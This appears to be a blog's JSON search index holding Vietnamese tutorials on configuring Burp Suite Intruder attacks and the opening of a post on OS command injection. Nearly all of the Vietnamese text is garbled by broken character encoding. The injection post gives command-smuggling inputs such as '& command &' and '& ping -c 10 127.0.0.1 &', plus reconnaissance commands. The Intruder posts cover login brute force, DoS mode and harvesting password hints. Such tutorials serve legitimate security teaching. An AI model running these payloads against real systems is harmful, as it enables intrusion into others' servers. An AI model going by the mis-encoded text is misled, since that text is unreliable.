ch·ªçn r·∫•t hay nh∆∞ l√† Number of threads, Number of retries on network failure, \u0026hellip;\n Number of threads (Professional): T√πy ch·ªçn n√†y s·∫Ω ki·ªÉm so√°t ƒë∆∞·ª£c s·ªë lu·ªìng ƒë∆∞·ª£c ch·∫°y ƒë·ªìng th·ªùi. Ch·ª©c nƒÉng n√†y d√πng ƒë·ªÉ gi·∫£m thi·ªÉu th·ªùi gian t·∫•n c√¥ng xu·ªëng ƒë·ªëi v·ªõi Payloads nhi·ªÅu data. T√≠nh nƒÉng ƒëa lu·ªìng n√†y r·∫•t ph√π h·ª£p v·ªõi c√°c cu·ªôc t·∫•n c√¥ng Brute Force v·ªõi s·ªë l∆∞·ª£ng Requests l·ªõn. Number of retries on network failure: N·∫øu x·∫£y ra l·ªói k·∫øt n·ªëi ho·∫∑c s·ª± c·ªë m·∫°ng th√¨ Burp s·∫Ω th·ª≠ l·∫°i y√™u c·∫ßu n√†y v·ªõi s·ªë l·∫ßn ch·ªâ ƒë·ªãnh m√¨nh config tr∆∞·ªõc khi b·ªè qua Request ƒë√≥ v√† ti·∫øp t·ª•c. ƒê·ªëi v·ªõi c√°c cu·ªôc t·∫•n c√¥ng v·ªõi nhi·ªÅu Request th√¨ l·ªói m·∫°ng l√† l·ªói ph·ªï bi·∫øn. V√¨ v·∫≠y t·ªët nh·∫•t l√† c·ª© th·ª≠ l·∫°i nhi·ªÅu l·∫ßn khi x·∫£y ra l·ªói. Pause before retry: Khi th·ª≠ l·∫°i 1 Request kh√¥ng th√†nh c√¥ng th√¨ Burp s·∫Ω ƒë·ª£i 1 kho·∫£ng th·ªùi gian tr∆∞·ªõc khi th·ª≠ l·∫°i l·∫ßn ti·∫øp theo. T√πy ch·ªçn n√†y kh√° l√† h·ªØu √≠ch khi Server b·ªã qu√° t·∫£i ho·∫∑c x·∫£y ra s·ª± c·ªë kh√¥ng li√™n t·ª•c. Throttle between requests: T√πy ch·ªçn ch·ªâ ƒë·ªãnh Burp sau 1 kho·∫£ng th·ªùi gian th√¨ m·ªõi th·ª±c hi·ªán 1 Request. T√πy ch·ªçn n√†y r·∫•t h·ªØu √≠ch khi b·∫°n mu·ªën \u0026ldquo;t√†ng h√¨nh\u0026rdquo; tr∆∞·ªõc nh·ªØng cu·ªôc t·∫•n c√¥ng d√†i h∆°i. Start time: ƒê·ªãnh th·ªùi gian khi b·∫Øt ƒë·∫ßu 1 cu·ªôc t·∫•n c√¥ng Vi·ªác s·ª≠ d·ª•ng nhu·∫ßn nhuy·ªÖn k·∫øt h·ª£p c√°c t√πy ch·ªçn n√†y gi√∫p b·∫°n ƒë√°ng k·ªÉ trong cu·ªôc t·∫•n c√¥ng m√¨nh t·∫°o ra, t√πy thu·ªôc v√†o hi·ªáu su·∫•t, kh·∫£ nƒÉng x·ª≠ l√Ω c·ªßa m√°y b·∫°n. N·∫øu b·∫°n th·∫•y r·∫±ng cu·ªôc t·∫•n c√¥ng ƒëang c√≥ ph·∫ßn h∆°i ch·∫≠m, b·∫°n n√™n tƒÉng s·ªë lu·ªìng l√™n. N·∫øu b·∫°n th·∫•y k·∫øt n·ªëi m·∫°ng c·ªßa b·∫°n h∆°i k√©m, h√£y th·ª≠ Number of retries on network failure v√† Pause before retry.  Attack Results Options C√†i ƒë·∫∑t n√†y s·∫Ω ki·ªÉm so√°t c√°c th√¥ng tin n√†o ƒë∆∞·ª£c ghi l·∫°i trong attack results. M√¨nh th√¨ kh√¥ng hay s·ª≠ d·ª•ng t√πy ch·ªçn n√†y l·∫Øm, th∆∞·ªùng th√¨ ƒë·ªÉ m·∫∑c ƒë·ªãnh theo Burp lu√¥n.\n Store requests / responses: C√°c t√πy ch·ªçn n√†y x√°c ƒë·ªãnh li·ªáu cu·ªôc t·∫•n c√¥ng s·∫Ω l∆∞u n·ªôi dung c·ªßa Requests v√† Responces ri√™ng l·∫ª. Vi·ªác l∆∞u Requests v√† Responces s·∫Ω ti√™u t·ªën dung l∆∞·ª£ng ·ªï ƒëƒ©a trong th∆∞ m·ª•c temp c·ªßa b·∫°n, nh∆∞ng cho ph√©p b·∫°n xem ƒë·∫ßy ƒë·ªß c√°c y√™u c·∫ßu n√†y trong m·ªôt cu·ªôc t·∫•n c√¥ng, l·∫∑p l·∫°i Requests ri√™ng l·∫ª n·∫øu c·∫ßn v√† g·ª≠i ch√∫ng ƒë·∫øn c√°c c√¥ng c·ª• Burp kh√°c. M·∫∑c ƒë·ªãnh th√¨ Burp ƒë√£ ch·ªçn ch·∫ø ƒë·ªô n√†y gi√∫p m√¨nh r·ªìi. Make unmodified baseline request: Use denial-of-service mode: D√πng ƒë·ªÉ DOS chƒÉng :v, ch·ª©c nƒÉng n√†y c√≥ th·ªÉ ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ th·ª±c hi·ªán c√°c cu·ªôc t·∫•n c√¥ng DOS, DDOS c·ªßa l·ªõp ·ª©ng d·ª•ng ƒë·ªëi v·ªõi c√°c ·ª©ng d·ª•ng d·ªÖ d√†ng b·ªã t·∫•n c√¥ng. Store full payloads: T√πy ch·ªçn n√†y ƒë∆∞·ª£c b·∫≠t th√¨ Burp s·∫Ω l∆∞u tr·ªØ c√°c payloads ƒë·∫ßy ƒë·ªß cho m·ªói k·∫øt qu·∫£. T√πy ch·ªçn n√†y s·∫Ω chi·∫øm th√™m b·ªô nh·ªõ c·ªßa b·∫°n nh∆∞ng c√≥ th·ªÉ cho ph√©p b·∫°n th·ª±c hi·ªán m·ªôt s·ªë h√†nh ƒë·ªông trong th·ªùi gian ch·∫°y.  Grep - match C√†i ƒë·∫∑t n√†y s·ª≠ d·ª•ng ƒë·ªÉ ch·ªâ ƒë·ªãnh c√°c ƒëo·∫°n string c√≥ ch·ª©a trong k·∫øt qu·∫£ Response. S·ª≠ d·ª•ng t√πy ch·ªçn n√†y r·∫•t m·∫°nh trong vi·ªác ph√¢n t√≠ch nhi·ªÅu Response. V√≠ d·ª• trong cu·ªôc t·∫•n c√¥ng Blind SQL Injection, qu√©t th√¥ng b√°o l·ªói, \u0026hellip;\nGrep - extract Option n√†y gi√∫p ta tr√≠ch xu·∫•t th√¥ng tin t·ª´ c√°c Response v√†o b·∫£ng k·∫øt qu·∫£. V√≠ d·ª•: ·ªû ƒë√¢y m√¨nh mu·ªën l·∫•y k·∫øt qu·∫£ l√† th√¥ng tin gi·ªØa /81906\u0026quot;\u0026gt; v√† \u0026lt;/a\u0026gt;\u0026lt;/li\u0026gt; th√¨ m√¨nh s·∫Ω l√†m nh∆∞ ·∫£nh tr√™n. B·∫°n c√≥ th·ªÉ b√¥i ƒëen ph·∫ßn k·∫øt qu·∫£ m√† b·∫°n mu·ªën tr√≠ch xu·∫•t, Burp Intruder s·∫Ω t·ª± ƒëi·ªÅn gi√∫p c√°c b·∫°n v√†o ph·∫ßn Start v√† End :D. R·∫•t ti·ªán ƒë√∫ng kh√¥ng.\nT√πy ch·ªçn n√†y r·∫•t h·ªØu √≠ch ƒë·ªÉ khai th√°c d·ªØ li·ªáu t·ª´ ·ª©ng d·ª•ng v√† h·ªó tr·ª£ m·ªôt lo·∫°t c√°c cu·ªôc t·∫•n c√¥ng. V√≠ d·ª• nh∆∞ ch·ª©c nƒÉng \u0026ldquo;qu√™n m·∫≠t kh·∫©u\u0026rdquo; l·∫•y t√™n ng∆∞·ªùi d√πng l√†m tham s·ªë v√† tr·∫£ v·ªÅ g·ª£i √Ω m·∫≠t kh·∫©u do ng∆∞·ªùi d√πng c·∫•u h√¨nh, b·∫°n c√≥ th·ªÉ nh√©t 1 payloads t√™n ng∆∞·ªùi d√πng ph·ªï bi·∫øn v√† thu th·∫≠p c√°c g·ª£i √Ω m·∫≠t kh·∫©u ƒë∆∞·ª£c li√™n k·∫øt v·ªõi t√†i kho·∫£n, sau ƒë√≥ qu√©t qua c√°c danh s√°ch n√†y ƒë·ªÉ d·ªÖ d√†ng ƒëo√°n ƒë∆∞·ª£c m·∫≠t kh·∫©u c·ªßa ng∆∞·ªùi d√πng.\nGrep - payloads C√†i ƒë·∫∑t n√†y ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ l·∫•y m·ª•c k·∫øt qu·∫£ t·ª´ Responses. N·∫øu t√πy ch·ªçn n√†y ƒë∆∞·ª£c b·∫≠t th√¨ Burp s·∫Ω th√™m 1 c·ªôt m·ªõi c√≥ ch·ª©a h·ªôp ki·ªÉm tra xem li·ªáu k·∫øt qu·∫£ b·∫°n g·∫Øn v√†o c√≥ ƒë∆∞·ª£c t√¨m th·∫•y trong Responses tr·∫£ v·ªÅ hay l√† kh√¥ng (n·∫øu c√≥ nhi·ªÅu b·ªô payloads th√¨ m·ªói 1 payloads s·∫Ω ·ª©ng v·ªõi m·ªói c·ªôt ri√™ng). T√≠nh nƒÉng n√†y kh·∫£ thi v·ªõi vi·ªác ph√°t hi·ªán XSS hay response injection vulnerabilities.\nT·ªïng k·∫øt Tr√™n ƒë√¢y l√† c√°c t√≠nh nƒÉng m√† Burp Intruder h·ªó tr·ª£ cho Attacker, t·ª´ vi·ªác ƒë√°nh d·∫•u c√°c m·ª•c c·∫ßn thay ƒë·ªïi gi√° tr·ªã r·ªìi ƒë·∫øn th√™m c√°c payloads ph·ª•c v·ª• cho vi·ªác t·∫•n c√¥ng. X·ª≠ l√Ω r·ªìi ph√¢n t√≠ch c√°c k·∫øt qu·∫£ thu ƒë∆∞·ª£c, tƒÉng t·ªëc x·ª≠ l√Ω b·∫±ng nhi·ªÅu lu·ªìng, hay th·ª≠ l·∫°i v·ªõi l·ªói m·∫°ng. Burp Intruder ho√†n to√†n ƒë√°p ·ª©ng ƒë·ªß cho c√°c Hacker kh√≥ t√≠nh nh·∫•t. Khi b·∫°n thu·∫ßn th·ª•c Burp Intruder th√¨ vi·ªác gi·∫£m t·∫£i kh√° nhi·ªÅu th·ªùi gian ph√¢n t√≠ch k·∫øt qu·∫£. Ch√∫c c√°c b·∫°n vui v·∫ª v·ªõi Burp Intruder :D\n","permalink":"https://minhtuanact.ml/posts/su-dung-burp-intruder-sao-cho-hieu-qua-phan-2/","summary":"Burp Intruder  Ti·∫øp t·ª•c cho ph·∫ßn 1 ƒë∆∞·ª£c vi·∫øt t·∫°i ƒë√¢y, m√¨nh s·∫Ω gi·ªõi thi·ªáu ti·∫øp cho c√°c b·∫°n c√°ch s·ª≠ d·ª•ng tab Options v√† c√°ch t·∫•n c√¥ng sao cho hi·ªáu qu·∫£ nh·∫•t khi s·ª≠ d·ª•ng Burp Intruder  C·∫•u h√¨nh cu·ªôc t·∫•n c√¥ng Options Attack Options  T·∫°i ƒë√¢y, sau khi b·∫°n ƒë√£ g·∫Øn Positions, truy·ªÅn Payloads th√¨ b·∫°n c≈©ng c√≥ th·ªÉ t·∫•n c√¥ng ƒë∆∞·ª£c r·ªìi. Nh∆∞ng t·∫•n c√¥ng sao cho hi·ªáu qu·∫£ th√¨ tab Options n√†y kh√° quan tr·ªçng, n√≥ c√≥ r·∫•t nhi·ªÅu t√πy ch·ªçn d√πng ƒë·ªÉ t·∫•n c√¥ng nh∆∞ request headers, the request engine, attack results, grep match, grep extract, grep payloads, v√† redirections.","title":"S·ª≠ d·ª•ng Burp Intruder sao cho hi·ªáu qu·∫£ [Ph·∫ßn 2]"},{"content":"Burp Intruder  Burp Intruder l√† m·ªôt c√¥ng c·ª• tuy·ªát v·ªùi ƒë·ªÉ automating customized attacks l√™n c√°c ·ª©ng d·ª•ng web. C√¥ng c·ª• n√†y theo m√¨nh th·∫•y n√≥ c·ª±c k·ª≥ m·∫°nh m·∫Ω v√† c√≥ th·ªÉ custom ƒë∆∞·ª£c. N√≥ s·ª≠ d·ª•ng ƒë·ªÉ th·ª±c hi·ªán h√†ng lo·∫°i c√°c h√†nh ƒë·ªông hay trinh s√°t. T·ª´ vi·ªác ƒëo√°n c√°c path ƒë∆°n gi·∫£n cho ƒë·∫øn khai th√°c c√°c l·ªó h·ªïng nh∆∞ XSS, SQL Injection, \u0026hellip;  C√°ch th·ª©c ho·∫°t ƒë·ªông  Burp Suite Intruder ho·∫°t ƒë·ªông b·∫±ng c√°ch s·ª≠a ƒë·ªïi request HTTP ban ƒë·∫ßu theo √Ω m√¨nh v√† t·ª± ƒë·ªông g·ª≠i c√°c payloads t·ªõi target. C√°c payloads c√≥ th·ªÉ t·ª± custom theo √Ω mu·ªën v√† ch√∫ng ta c√≥ th·ªÉ filter nh·ªØng response t·ª´ Website. ƒê·ªëi v·ªõi m·ªói cu·ªôc t·∫•n c√¥ng, b·∫°n ph·∫£i th√™m v√†o ƒë√≥ 1 ho·∫∑c nhi·ªÅu b·ªô Payloads v√†o c√°c v·ªã tr√≠ ƒë√°nh d·∫•u trong Positions. C√≥ nhi·ªÅu c√°c c√°ch ƒë·ªÉ t·∫°o nhi·ªÅu b·ªô Payloads. Burp Intruder c≈©ng c√≥ nhi·ªÅu t√πy ch·ªçn ƒë·ªÉ gi√∫p ph√¢n t√≠ch k·∫øt qu·∫£ v√† x√°c ƒë·ªãnh c√°c m·ª•c ti√™u ƒë·ªÉ ƒëi·ªÅu tra th√™m.  C·∫•u h√¨nh m·ªôt cu·ªôc t·∫•n c√¥ng  UI Intruder ch√≠nh cho ph√©p b·∫°n c·∫•u h√¨nh ƒë·ªìng th·ªùi nhi·ªÅu cu·ªôc t·∫•n c√¥ng, m·ªói 1 cu·ªôc t·∫•n c√¥ng l√† 1 tab ri√™ng. Khi b·∫°n g·ª≠i y√™u c·∫ßu ƒë·∫øn Intruder th√¨ n√≥ s·∫Ω t·ª± ƒë·ªông m·ªü tab v√† ƒë√°nh s·ªë ri√™ng. M·ªói tab c·∫•u h√¨nh th√¨ ch·ª©a m·ªôt s·ªë tab ph·ª• kh√°c, ph·ª•c v·ª• cho vi·ªác config cu·ªôc t·∫•n c√¥ng ƒë√≥.  Chi ti·∫øt t·ª´ng tab  Target: S·ª≠ d·ª•ng ƒë·ªÉ c·∫•u h√¨nh chi ti·∫øt c·ªßa target server cho cu·ªôc t·∫•n c√¥ng. Positions: ·ªû ƒë√¢y s·∫Ω ƒë∆∞·ª£c ƒë·ªãnh c·∫•u h√¨nh m·∫´u cho cu·ªôc t·∫•n c√¥ng h√†ng lo·∫°t, c√πng v·ªõi v·ªã tr√≠ c·ªßa payloads v√† ki·ªÉu t·∫•n c√¥ng. Payloads: S·ª≠ d·ª•ng ƒë·ªÉ c·∫•u h√¨nh 1 ho·∫∑c nhi·ªÅu b·ªô payloads, s·∫Ω ƒë∆∞·ª£c ƒë·∫∑t v√†o c√°c positions trong cu·ªôc t·∫•n c√¥ng. Options: S·ª≠ d·ª•ng ƒë·ªÉ c·∫•u h√¨nh nhi·ªÅu t√πy ch·ªçn kh√°c v·ªõi cu·ªôc t·∫•n c√¥ng ƒë√≥.  Target: Tab n√†y ƒë∆∞·ª£c s·ª≠ d·ª•ng ƒë·ªÉ c·∫•u h√¨nh chi ti·∫øt c·ªßa target server cho cu·ªôc t·∫•n c√¥ng.\n Host: ƒê√¢y l√† ƒë·ªãa ch·ªâ IP ho·∫∑c t√™n m√°y ch·ªß c·ªßa target server. Port: ƒê√¢y l√† s·ªë c·ªïng c·ªßa d·ªãch v·ª• HTTP/S. Use HTTPS: S·ª≠ d·ª•ng HTTPS hay l√† kh√¥ng. C√°ch d·ªÖ nh·∫•t ƒë·ªÉ c·∫•u h√¨nh c√°c chi ti·∫øt n√†y l√† s·ª≠ d·ª•ng HTTP history n·∫±m trong tab Proxy ho·∫∑c b·∫•t c·ª© n∆°i n√†o trong Burp r·ªìi g·ª≠i ƒë·∫øn Burp Intruder. ƒêi·ªÅu n√†y s·∫Ω g·ª≠i y√™u c·∫ßu ƒë·ªÉ Burp Intruder m·ªü 1 tab m·ªõi trong Intruder v√† s·∫Ω ƒë∆∞·ª£c t·ª± ƒë·ªông ƒëi·ªÅn v√†o Target v√† Positions.  Positions: Payload Positions\n ·ªû ƒë√¢y m√¨nh s·∫Ω c·∫•u h√¨nh request template ƒë·ªÉ t·∫•n c√¥ng.  Payload markers\n C√°c d·∫•u payloads ƒë∆∞·ª£c ƒë·∫∑t trong ¬ß¬ß, khi positions payload ƒë∆∞·ª£c ch·ªâ ƒë·ªãnh, c√°c ƒëi·ªÉm ƒë√°nh d·∫•u ƒë√≥ s·∫Ω ƒë∆∞·ª£c thay th·∫ø b·∫±ng payloads. ƒê·ªÉ d·ªÖ d√†ng h∆°n trong vi·ªác config th√¨ Intruder s·∫Ω t·ª± ƒë·ªông t√¥ m√†u t·ª´ng c·∫∑p d·∫•u payloads v√† b·∫•t k·ª≥ k√Ω t·ª± hay vƒÉn b·∫£n n√†o b√™n trong ch√∫ng. Add ¬ß, Clear ¬ß, Auto ¬ß, Refresh kh√° l√† d·ªÖ d√†ng, b·∫°n ƒë·ªçc t·ª± t√¨m hi·ªÉu nha ^^  C√°c ki·ªÉu t·∫•n c√¥ng:\n1. Sniper\n  Sniper ch·ªâ s·ª≠ d·ª•ng m·ªôt b·ªô payload, n·∫øu c√≥ 1 position n√≥ s·∫Ω ch√®n l·∫ßn l∆∞·ª£t t·ª´ng payload t·ª´ ƒë·∫ßu ƒë·∫øn cu·ªëi danh s√°ch. Trong tr∆∞·ªùng h·ª£p c√≥ nhi·ªÅu position, n√≥ s·∫Ω ch√®n t·ª´ng payload trong danh s√°ch v√†o position 1, sau ƒë√≥ ti·∫øp t·ª•c ƒë·∫øn v·ªõi position 2, position 3‚Ä¶\n  T·ªïng s·ªë request c·ªßa ki·ªÉu t·∫•n c√¥ng Sniper = s·ªë payload c·ªßa b·ªô payload * s·ªë position\n  ·ª®ng d·ª•ng: t√¨m l·ªó h·ªïng SQL injection, XSS, d√≤ password m·ªôt user bi·∫øt tr∆∞·ªõc‚Ä¶ V√≠ d·ª•:\n1 2 3 4 5 6 7 8 9 10  Request 1: position1=payload[0]\u0026amp;position2= Request 2: position1=payload[1]\u0026amp;position2= Request 3: position1=payload[2]\u0026amp;position2= ... Sau khi ch√®n h·∫øt payload trong danh s√°ch v√†o position1 s·∫Ω ti·∫øp t·ª•c v·ªõi position2 Request 4: position1=\u0026amp;position2=payload[0] Request 5: position1=\u0026amp;position2=payload[1] Request 6: position1=\u0026amp;position2=payload[2] ...     2. Battering ram\n T∆∞∆°ng t·ª± nh∆∞ Sniper th√¨ ki·ªÉu Battering ram ch·ªâ d√πng 1 b·ªô payload, tuy nhi√™n n√≥ ƒë∆∞·ª£c d√πng trong tr∆∞·ªùng h·ª£p pentest ·ª©ng d·ª•ng c√≥ 2 position tr·ªü l√™n v√† c√°c position s·∫Ω d√πng chung m·ªôt payload t·∫°i m·ªôt th·ªùi ƒëi·ªÉm. T·ªïng s·ªë request c·ªßa ki·ªÉu t·∫•n c√¥ng Battering ram = s·ªë payload c·ªßa b·ªô payload. ·ª®ng d·ª•ng: d√≤ gi√° tr·ªã user/password ng∆∞·ªùi ƒë·∫∑t gi·ªëng nhau‚Ä¶ V√≠ d·ª•: 1 2 3 4  Request 1: position1=payload[0]\u0026amp;position2=payload[0] Request 2: position1=payload[1]\u0026amp;position2=payload[1] Request 3: position1=payload[2]\u0026amp;position2=payload[2] ...     3. Pitchfork\n T·∫•n c√¥ng Pitchfork s·ª≠ d·ª•ng nhi·ªÅu b·ªô payload. M·ªói position t∆∞∆°ng ·ª©ng v·ªõi m·ªôt b·ªô payload. T·∫°i m·ªôt th·ªùi ƒëi·ªÉm, c√°c position s·∫Ω ch·∫°y ƒë·ªìng th·ªùi t∆∞∆°ng ·ª©ng v·ªõi b·ªô payload cho t·ª´ng position. N√≥i c√°ch kh√°c, v·ªõi request ƒë·∫ßu ti√™n, t·∫°i position1 s·∫Ω d√πng payload ƒë·∫ßu ti√™n trong b·ªô payload1, t·∫°i position2 s·∫Ω d√πng payload ƒë·∫ßu ti√™n trong b·ªô payload2, sau ƒë√≥ t∆∞∆°ng t·ª± v·ªõi request ti·∫øp theo\u0026hellip; T·ªïng s·ªë request c·ªßa ki·ªÉu t·∫•n c√¥ng Pichfork = s·ªë payload c·ªßa b·ªô payload nh·ªè nh·∫•t. V√≠ d·ª•: 1 2 3 4  Request 1: position1=payload1[0]\u0026amp;position2=payload2[0] Request 2: position1=payload1[1]\u0026amp;position2=payload2[1] Request 3: position1=payload1[2]\u0026amp;position2=payload2[2] ...     4. Cluster Bomb\n T∆∞∆°ng t·ª± v·ªõi t·∫•n c√¥ng Pitchfork, Cluster Bomb s·ª≠ d·ª•ng nhi·ªÅu b·ªô payload, m·ªói b·ªô t∆∞∆°ng ·ª©ng v·ªõi m·ªôt position. Tuy nhi√™n v·ªõi Cluster Bomb c√°c position s·∫Ω ƒë∆∞·ª£c ch·∫°y ƒë·ªìng th·ªùi, payload t·∫°i c√°c postion s·∫Ω ƒë∆∞·ª£c k·∫øt h·ª£p ch√©o v·ªõi nhau. ·ª®ng d·ª•ng: brute force trang ƒëƒÉng nh·∫≠p‚Ä¶ 1 2 3 4 5 6 7 8 9 10  Request 1: position1=payload1[0]\u0026amp;position2=payload2[0] Request 2: position1=payload1[1]\u0026amp;position2=payload2[0] Request 3: position1=payload1[2]\u0026amp;position2=payload2[0] ... Sau khi ch√®n l·∫ßn l∆∞·ª£t h·∫øt b·ªô payload1 v√†o position1 v·ªõi payload ƒë·∫ßu ti√™n ·ªü position2 qu√° tr√¨nh s·∫Ω ti·∫øp t·ª•c nh∆∞ sau: Request 4: position1=payload1[0]\u0026amp;position2=payload2[1] Request 5: position1=payload1[1]\u0026amp;position2=payload2[1] Request 6: position1=payload1[2]\u0026amp;position2=payload2[1]      Ngu·ªìn: https://whitehat.vn/threads/tim-hieu-cac-loai-tan-cong-bang-burp-suite-intruder.12643/   Payloads:  ·ªû ƒë√¢y ta s·∫Ω s·ª≠ d·ª•ng ƒë·ªÉ c·∫•u h√¨nh m·ªôt ho·∫∑c nhi·ªÅu b·ªô payloads. S·ªë l∆∞·ª£ng payloads th√¨ t√πy v√†o lo·∫°i t·∫•n c√¥ng ƒë∆∞·ª£c x√°c ƒë·ªãnh trong Positions. ƒê·ªëi v·ªõi fuzzing parameters hay brute force th√¨ th∆∞·ªùng s·ª≠ d·ª•ng 1 b·ªô payloads duy nh·∫•t.  Payload Sets:\n ·ªû ƒë√¢y m√¨nh s·∫Ω ƒë∆∞·ª£c c·∫•u h√¨nh t·ª´ng b·ªô payloads v√† ki·ªÉu payloads, ƒë·ªëi v·ªõi nh·ªØng ki·ªÉu payloads th√¨ b·∫°n ƒë·ªçc c√≥ th·ªÉ t√¨m hi·ªÉu th√™m t·∫°i ƒë√¢y. C√≥ r·∫•t nhi·ªÅu ki·ªÉu cho b·∫°n l·ª±a ch·ªçn, t√πy theo m·ª•c ƒë√≠ch t·∫•n c√¥ng l√† g√¨.  Payload Options\n T·∫°i ƒë√¢y m√¨nh s·∫Ω n·∫°p c√°c payloads c·∫ßn thi·∫øt ƒë·ªÉ n·∫°p v√†o ch·ªó ƒë√£ ƒë√°nh d·∫•u t·∫°i Positions. C√≥ nhi·ªÅu danh s√°ch cho b·∫°n l·ª±a ch·ªçn t·∫°i Add from list ...  Payload processing\n T·∫°i ƒë√¢y l√† n∆°i m√† m√¨nh x·ª≠ l√Ω c√°c payload v·ªõi c√°c quy t·∫Øc nh∆∞ th√™m ti·ªÅn t·ªë ph√≠a tr∆∞·ªõc payloads hay th√™m h·∫≠u t·ªë ph√≠a sau payloads, \u0026hellip; C√°c t√πy ch·ªçn ƒë√£ ƒë∆∞·ª£c vi·∫øt chi ti·∫øt t·∫°i ƒë√¢y.  Payload Encoding\n B·∫°n c√≥ th·ªÉ ƒë·ªãnh c·∫•u h√¨nh c√°c k√Ω t·ª± trong payloads ph·∫£i ƒë∆∞·ª£c m√£ h√≥a URL ƒë·ªÉ truy·ªÅn trong HTTP. Vi·ªác n√†y s·∫Ω ƒë∆∞·ª£c √°p d·ª•ng sau c√πng sau khi b·∫•t k·ª≥ Payload Processing Rule ƒë∆∞·ª£c th·ª±c thi.  Tham kh·∫£o  https://whitehat.vn/threads/tim-hieu-cac-loai-tan-cong-bang-burp-suite-intruder.12643/ https://portswigger.net/burp/documentation/desktop/tools/intruder   ·ªû ph·∫ßn 2 m√¨nh s·∫Ω vi·∫øt ti·∫øp m·ª•c Option c√°c th√¥ng s·ªë k·∫øt qu·∫£ v√† c√°ch Intruder sao cho hi·ªáu qu·∫£ nh√© :D\nPh·∫ßn 2: S·ª≠ d·ª•ng Burp Intruder sao cho hi·ªáu qu·∫£ [Ph·∫ßn 2]\n ","permalink":"https://minhtuanact.ml/posts/su-dung-burp-suite-intruder-sao-cho-hieu-qua-phan-1/","summary":"Burp Intruder  Burp Intruder l√† m·ªôt c√¥ng c·ª• tuy·ªát v·ªùi ƒë·ªÉ automating customized attacks l√™n c√°c ·ª©ng d·ª•ng web. C√¥ng c·ª• n√†y theo m√¨nh th·∫•y n√≥ c·ª±c k·ª≥ m·∫°nh m·∫Ω v√† c√≥ th·ªÉ custom ƒë∆∞·ª£c. N√≥ s·ª≠ d·ª•ng ƒë·ªÉ th·ª±c hi·ªán h√†ng lo·∫°i c√°c h√†nh ƒë·ªông hay trinh s√°t. T·ª´ vi·ªác ƒëo√°n c√°c path ƒë∆°n gi·∫£n cho ƒë·∫øn khai th√°c c√°c l·ªó h·ªïng nh∆∞ XSS, SQL Injection, \u0026hellip;  C√°ch th·ª©c ho·∫°t ƒë·ªông  Burp Suite Intruder ho·∫°t ƒë·ªông b·∫±ng c√°ch s·ª≠a ƒë·ªïi request HTTP ban ƒë·∫ßu theo √Ω m√¨nh v√† t·ª± ƒë·ªông g·ª≠i c√°c payloads t·ªõi target.","title":"S·ª≠ d·ª•ng Burp Suite Intruder sao cho hi·ªáu qu·∫£ [Ph·∫ßn 1]"},{"content":"OS Command Injection l√† g√¨? OS Command Injection (hay c√≤n ƒë∆∞·ª£c g·ªçi l√† shell injection) l√† m·ªôt l·ªó h·ªïng b·∫£o m·∫≠t web cho ph√©p k·∫ª t·∫•n c√¥ng th·ª±c thi c√°c l·ªánh h·ªá ƒëi·ªÅu h√†nh (OS) t√πy √Ω tr√™n m√°y ch·ªß ƒëang ch·∫°y service n√†o ƒë√≥. K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ t·∫≠n d·ª•ng l·ªó h·ªïng n√†y ƒë·ªÉ khai th√°c, l·∫•y th√¥ng tin, chuy·ªÉn cu·ªôc t·∫•n c√¥ng sang h·ªá th·ªëng kh√°c b√™n trong t·ªï ch·ª©c Th·ª±c hi·ªán c√°c l·ªánh t√πy √Ω V√≠ d·ª•: https://insecure-website.com/stockStatus?productID=381\u0026amp;storeID=29\n·ªû ƒë√¢y ƒë·ªÉ l·∫•y th√¥ng tin th√¨ web s·∫Ω g·ªçi productID v√† store. Nh∆∞ng v√¨ m·ªôt v√†i l√Ω do n√†o ƒë√≥, ch·ª©c nƒÉng ƒë∆∞·ª£c tri·ªÉn khai b·∫±ng c√°ch g·ªçi l·ªánh shell v·ªõi productID v√† store l√†m ƒë·ªëi s·ªë:\n1  stockreport.pl 381 29   N·∫øu h·ªá th·ªëng kh√¥ng ƒë∆∞·ª£c b·∫£o v·ªá ch·ªëng l·∫°i OS Command Injection th√¨ Attacker c√≥ th·ªÉ g·ª≠i ƒë·∫ßu v√†o sau ƒë·ªÉ th·ª±c thi l·ªánh t√πy √Ω\n1  \u0026amp; command \u0026amp;   V√≠ d·ª•: https://insecure-website.com/stockStatus?productID=381\u0026amp;id\u0026amp;\u0026amp;storeID=29\nC√°c l·ªánh th∆∞·ªùng ƒë∆∞·ª£c s·ª≠ d·ª•ng    Purpose of command Linux Windows     T√™n ng∆∞·ªùi d√πng hi·ªán t·∫°i whoami whoami   OS OSuname -a ver   C·∫•u h√¨nh m·∫°ng ifconfig ipconfig   K·∫øt n·ªëi m·∫°ng netstat -an netstat -an   Ti·∫øn tr√¨nh ƒëang ch·∫°y ps -ef tasklist    L·ªó h·ªïng blind OS command injection Nhi·ªÅu tr∆∞·ªùng h·ª£p OS command injection l√† blind vulnerabilities. C√≥ nghƒ©a l√† ƒë·∫ßu ra s·∫Ω kh√¥ng tr·∫£ v·ªÅ trong HTTP response. V·∫≠y k·∫øt qu·∫£ s·∫Ω k hi·ªÉn th·ªã tr√™n m√†n h√¨nh. V·∫≠y c√≥ c√°ch n√†o x√°c ƒë·ªãnh ƒë∆∞·ª£c blind vulnerabilities.\nC√≥ th·ªÉ s·ª≠ d·ª•ng time delays ƒë·ªÉ x√°c ƒë·ªãnh ƒë∆∞·ª£c blind vulnerabilities. N√≥ s·∫Ω k√≠ch ho·∫°t ƒë·ªô tr·ªÖ, cho ph√©p b·∫°n x√°c nh·∫≠n r·∫±ng l·ªánh n√†y ƒë√£ ƒë∆∞·ª£c th·ª±c thi hay ch∆∞a d·ª±a v√†o th·ªùi gian m√† ·ª©ng d·ª•ng c·∫ßn ƒë·ªÉ ƒë√°p ·ª©ng. L·ªánh ping l√† l·ªánh hi·ªáu qu·∫£ ƒë·ªÉ th·ª±c hi·ªán vi·ªác n√†y, v√¨ n√≥ cho ph√©p ch·ªâ ƒë·ªãnh g√≥i ICMP c·∫ßn g·ª≠i v√† th·ªùi gian ƒë·ªÉ l·ªánh ch·∫°y:\n1  \u0026amp; ping -c 10 127.0.0.1 \u0026amp;   C√≥ th·ªÉ khai th√°c l·ªó h·ªïng n√†y b·∫±ng c√°ch chuy·ªÉn h∆∞·ªõng ƒë·∫ßu ra t·ª´ l·ªánh ch√®n v√†o 1 t·ªáp trong th∆∞ m·ª•c g·ªëc m√† b·∫°n c√≥ th·ªÉ ƒë·ªçc n√≥ b·∫±ng tr√¨nh duy·ªát c·ªßa m√¨nh.\nV√≠ d·ª•: 